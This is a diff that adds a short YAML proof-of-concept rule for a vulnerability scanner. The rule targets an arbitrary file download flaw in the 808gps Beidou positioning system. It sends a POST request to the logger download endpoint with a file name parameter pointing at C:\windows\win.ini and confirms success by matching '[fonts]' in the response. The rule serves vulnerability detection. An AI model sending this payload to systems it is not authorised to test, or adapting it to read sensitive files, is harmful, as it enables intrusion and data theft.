@@ -1,0 +1,14 @@
+name: 808gps-filedownload
+rules:
+  - method: POST
+    path: "/808gps/logger/downloadLogger.action"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "fileName=C:\\windows\\win.ini"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"[fonts]")
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "808gps 北斗定位系统 任意文件下载漏洞"
